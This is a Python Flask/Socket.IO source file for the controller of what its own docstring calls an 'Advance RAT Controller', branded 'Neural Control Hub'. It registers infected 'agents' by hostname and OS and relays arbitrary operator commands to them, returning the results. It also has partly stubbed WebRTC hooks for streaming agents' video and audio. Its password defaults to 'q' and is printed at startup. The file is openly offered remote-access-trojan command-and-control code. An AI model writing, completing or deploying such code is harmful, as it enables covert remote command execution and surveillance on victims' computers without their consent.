# Windows-compatible controller
import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, session, flash, render_template_string, render_template
from flask_socketio import SocketIO, emit, join_room, leave_room
from collections import defaultdict
import datetime
import time
import os
import base64
import queue
import hashlib
import hmac
import secrets
import threading
import platform

# WebRTC imports for SFU functionality - Windows compatible
WEBRTC_AVAILABLE = False
try:
    import asyncio
    import aiortc
    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack
    from aiortc.contrib.media import MediaPlayer, MediaRecorder
    from aiortc.mediastreams import MediaStreamError
    WEBRTC_AVAILABLE = True
    print("WebRTC (aiortc) support enabled")
except ImportError as e:
    WEBRTC_AVAILABLE = False
    print(f"WebRTC (aiortc) not available - {e}")
    print("Falling back to Socket.IO streaming only")
except Exception as e:
    WEBRTC_AVAILABLE = False
    print(f"WebRTC (aiortc) initialization failed - {e}")
    print("Falling back to Socket.IO streaming only")

# Configuration Management
class Config:
    """Configuration class for Advance RAT Controller"""
    
    # Admin Authentication
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'q')
    
    # Flask Configuration
    SECRET_KEY = os.environ.get('SECRET_KEY', None)
    
    # Server Configuration
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    
    # Security Settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
    
    # Password Security Settings
    SALT_LENGTH = 32  # Length of salt in bytes
    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2

# Initialize Flask app with configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key
socketio = SocketIO(app, async_mode='eventlet')

# WebRTC Configuration
WEBRTC_CONFIG = {
    'enabled': WEBRTC_AVAILABLE,
    'ice_servers': [
        {'urls': 'stun:stun.l.google.com:19302'},
        {'urls': 'stun:stun1.l.google.com:19302'},
        {'urls': 'stun:stun2.l.google.com:19302'},
        {'urls': 'stun:stun3.l.google.com:19302'},
        {'urls': 'stun:stun4.l.google.com:19302'}
    ],
    'codecs': {
        'video': ['VP8', 'VP9', 'H.264'],
        'audio': ['Opus', 'PCM']
    },
    'simulcast': True,
    'svc': True,
    'bandwidth_estimation': True,
    'adaptive_bitrate': True,
    'frame_dropping': True,
    'quality_levels': {
        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
    },
    'performance_tuning': {
        'keyframe_interval': 2,  # seconds
        'disable_b_frames': True,
        'ultra_low_latency': True,
        'hardware_acceleration': True,
        'gop_size': 60,  # frames at 30fps = 2 seconds
        'max_bitrate_variance': 0.3  # 30% variance allowed
    },
    'monitoring': {
        'connection_quality_metrics': True,
        'automatic_reconnection': True,
        'detailed_logging': True,
        'stats_interval': 1000,  # ms
        'quality_thresholds': {
            'min_bitrate': 100000,  # 100 kbps
            'max_latency': 200,  # 200ms
            'max_packet_loss': 0.05,  # 5%
            'min_fps': 15
        }
    }
}

# Production scale metrics
PRODUCTION_SCALE = {
    'current_implementation': 'aiortc',
    'target_implementation': 'mediasoup',
    'scalability_limits': {
        'aiorttc_max_viewers': 10,
        'mediasoup_max_viewers': 1000
    },
    'performance_metrics': {
        'current_latency': 150,  # ms
        'target_latency': 50,  # ms
        'current_bandwidth': 2000000,  # 2 Mbps
        'target_bandwidth': 10000000  # 10 Mbps
    }
}

# Global variables for agent management
AGENTS_DATA = {}
LOGIN_ATTEMPTS = defaultdict(lambda: (0, None))

# Password security functions
def generate_salt():
    """Generate a random salt for password hashing"""
    return secrets.token_bytes(Config.SALT_LENGTH)

def hash_password(password, salt=None):
    """Hash a password using PBKDF2 with SHA256"""
    if salt is None:
        salt = generate_salt()
    
    # Use PBKDF2 with SHA256 for secure password hashing
    key = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        Config.HASH_ITERATIONS
    )
    
    return base64.b64encode(key).decode('utf-8'), salt

def verify_password(password, stored_hash, stored_salt):
    """Verify a password against stored hash and salt"""
    try:
        salt_bytes = base64.b64decode(stored_salt.encode('utf-8'))
        hash_bytes = base64.b64decode(stored_hash.encode('utf-8'))
        
        # Hash the provided password with the stored salt
        key = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt_bytes,
            Config.HASH_ITERATIONS
        )
        
        # Compare the computed hash with the stored hash
        return hmac.compare_digest(key, hash_bytes)
    except Exception as e:
        print(f"Password verification error: {e}")
        return False

def create_secure_password_hash(password):
    """Create a secure hash of a password with salt"""
    hash_value, salt = hash_password(password)
    return {
        'hash': hash_value,
        'salt': base64.b64encode(salt).decode('utf-8'),
        'iterations': Config.HASH_ITERATIONS,
        'algorithm': 'PBKDF2-SHA256'
    }

# WebRTC functions (only if available)
if WEBRTC_AVAILABLE:
    def create_webrtc_peer_connection(agent_id):
        """Create a WebRTC peer connection for an agent"""
        try:
            pc = RTCPeerConnection()
            
            @pc.on("connectionstatechange")
            async def on_connectionstatechange():
                print(f"WebRTC connection state for {agent_id}: {pc.connectionState}")
            
            @pc.on("iceconnectionstatechange")
            async def on_iceconnectionstatechange():
                print(f"WebRTC ICE connection state for {agent_id}: {pc.iceConnectionState}")
            
            @pc.on("track")
            async def on_track(track):
                print(f"WebRTC track received from {agent_id}: {track.kind}")
                # Handle incoming media tracks
                if track.kind == "video":
                    # Process video track
                    pass
                elif track.kind == "audio":
                    # Process audio track
                    pass
            
            return pc
        except Exception as e:
            print(f"Error creating WebRTC peer connection: {e}")
            return None
    
    def close_webrtc_connection(agent_id):
        """Close WebRTC connection for an agent"""
        try:
            if agent_id in AGENTS_DATA and 'webrtc_pc' in AGENTS_DATA[agent_id]:
                pc = AGENTS_DATA[agent_id]['webrtc_pc']
                pc.close()
                del AGENTS_DATA[agent_id]['webrtc_pc']
                print(f"WebRTC connection closed for {agent_id}")
        except Exception as e:
            print(f"Error closing WebRTC connection: {e}")
    
    def get_webrtc_stats(agent_id):
        """Get WebRTC statistics for an agent"""
        try:
            if agent_id in AGENTS_DATA and 'webrtc_pc' in AGENTS_DATA[agent_id]:
                pc = AGENTS_DATA[agent_id]['webrtc_pc']
                # Return WebRTC statistics
                return {
                    'connection_state': pc.connectionState,
                    'ice_connection_state': pc.iceConnectionState,
                    'signaling_state': pc.signalingState
                }
        except Exception as e:
            print(f"Error getting WebRTC stats: {e}")
        return None

# Authentication functions
def is_authenticated():
    """Check if user is authenticated"""
    return 'authenticated' in session and session['authenticated'] == True

def is_ip_blocked(ip):
    """Check if IP is blocked due to too many failed login attempts"""
    if ip in LOGIN_ATTEMPTS:
        attempts, timestamp = LOGIN_ATTEMPTS[ip]
        if attempts >= Config.MAX_LOGIN_ATTEMPTS:
            if timestamp and (time.time() - timestamp) < Config.LOGIN_TIMEOUT:
                return True
            else:
                # Reset if timeout has passed
                clear_login_attempts(ip)
    return False

def record_failed_login(ip):
    """Record a failed login attempt for an IP"""
    attempts, _ = LOGIN_ATTEMPTS[ip]
    LOGIN_ATTEMPTS[ip] = (attempts + 1, time.time())

def clear_login_attempts(ip):
    """Clear failed login attempts for an IP"""
    if ip in LOGIN_ATTEMPTS:
        del LOGIN_ATTEMPTS[ip]

def require_auth(f):
    """Decorator to require authentication"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Routes
@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login route"""
    if request.method == 'POST':
        password = request.form.get('password')
        ip = request.remote_addr
        
        # Check if IP is blocked
        if is_ip_blocked(ip):
            flash('Too many failed login attempts. Please try again later.', 'error')
            return render_template_string('''
                <!DOCTYPE html>
                <html>
                <head><title>Login - Neural Control Hub</title></head>
                <body>
                    <h1>Login</h1>
                    <p style="color: red;">Too many failed login attempts. Please try again later.</p>
                    <a href="/login">Try Again</a>
                </body>
                </html>
            ''')
        
        # Verify password
        if password == Config.ADMIN_PASSWORD:
            session['authenticated'] = True
            session['login_time'] = time.time()
            clear_login_attempts(ip)
            return redirect(url_for('dashboard'))
        else:
            record_failed_login(ip)
            flash('Invalid password', 'error')
    
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head><title>Login - Neural Control Hub</title></head>
        <body>
            <h1>Login</h1>
            <form method="POST">
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
    ''')

@app.route('/logout')
def logout():
    """Logout route"""
    session.clear()
    return redirect(url_for('login'))

@app.route("/")
def index():
    """Main index route"""
    if is_authenticated():
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route("/dashboard")
@require_auth
def dashboard():
    """Dashboard route - serves React frontend"""
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Neural Control Hub - Dashboard</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
        </head>
        <body>
            <div id="root"></div>
            <script type="module" src="http://localhost:5173/src/main.tsx"></script>
        </body>
        </html>
    ''')

# Socket.IO event handlers
@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    print(f"Client disconnected: {request.sid}")

@socketio.on('operator_connect')
def handle_operator_connect():
    """Handle operator connection"""
    join_room('operators')
    emit('operator_connected', {'status': 'connected'})

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """Handle agent connection"""
    agent_id = data.get('agent_id')
    if agent_id:
        AGENTS_DATA[agent_id] = {
            'sid': request.sid,
            'hostname': data.get('hostname', agent_id),
            'os': data.get('os', 'Unknown'),
            'connected_at': datetime.datetime.now().isoformat()
        }
        join_room('agents')
        emit('agent_connected', {'agent_id': agent_id, 'status': 'connected'}, room='operators')

@socketio.on('execute_command')
def handle_execute_command(data):
    """Handle command execution"""
    command = data.get('command')
    agent_id = data.get('agent_id')
    
    if agent_id and agent_id in AGENTS_DATA:
        emit('execute_command', {'command': command}, room=AGENTS_DATA[agent_id]['sid'])
        emit('command_sent', {'agent_id': agent_id, 'command': command}, room='operators')

@socketio.on('command_result')
def handle_command_result(data):
    """Handle command result from agent"""
    agent_id = data.get('agent_id')
    result = data.get('result')
    
    emit('command_result', {
        'agent_id': agent_id,
        'result': result,
        'timestamp': datetime.datetime.now().isoformat()
    }, room='operators')

# WebRTC event handlers (only if WebRTC is available)
if WEBRTC_AVAILABLE:
    @socketio.on('webrtc_offer')
    def handle_webrtc_offer(data):
        """Handle WebRTC offer"""
        agent_id = data.get('agent_id')
        offer_data = data.get('offer')
        
        if agent_id and offer_data:
            # Handle WebRTC offer
            emit('webrtc_offer_received', {'agent_id': agent_id}, room='operators')

    @socketio.on('webrtc_get_stats')
    def handle_webrtc_get_stats(data):
        """Handle WebRTC stats request"""
        agent_id = data.get('agent_id')
        stats = get_webrtc_stats(agent_id)
        emit('webrtc_stats', {'agent_id': agent_id, 'stats': stats}, room=request.sid)

# System event handlers
@socketio.on('get_agent_stats')
def handle_get_agent_stats():
    """Get agent statistics"""
    agent_list = []
    for agent_id, data in AGENTS_DATA.items():
        agent_list.append({
            'id': agent_id,
            'name': data.get('hostname', agent_id),
            'os': data.get('os', 'Unknown'),
            'online': bool(data.get('sid')),
            'connected_at': data.get('connected_at')
        })
    
    emit('agent_stats_response', {'agents': agent_list}, room=request.sid)

@socketio.on('get_system_health')
def handle_get_system_health():
    """Get system health information"""
    uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(0)
    emit('system_health_response', {
        'controller_status': 'Active',
        'platform': platform.system(),
        'uptime': f"{uptime.days}d {uptime.seconds//3600}h",
        'last_update': datetime.datetime.now().strftime('%H:%M:%S'),
        'webrtc_available': WEBRTC_AVAILABLE
    }, room=request.sid)

@socketio.on('refresh_dashboard')
def handle_refresh_dashboard():
    """Refresh dashboard data"""
    emit('dashboard_refreshed', {
        'timestamp': datetime.datetime.now().isoformat(),
        'agent_count': len(AGENTS_DATA),
        'webrtc_enabled': WEBRTC_AVAILABLE
    }, room=request.sid)

if __name__ == "__main__":
    print("Starting Neural Control Hub (Windows Compatible)...")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"Admin password: {Config.ADMIN_PASSWORD}")
    print(f"Server will be available at: http://{Config.HOST}:{Config.PORT}")
    print(f"WebRTC support: {'Enabled' if WEBRTC_AVAILABLE else 'Disabled (Windows compatibility)'}")
    print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
    print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
    
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)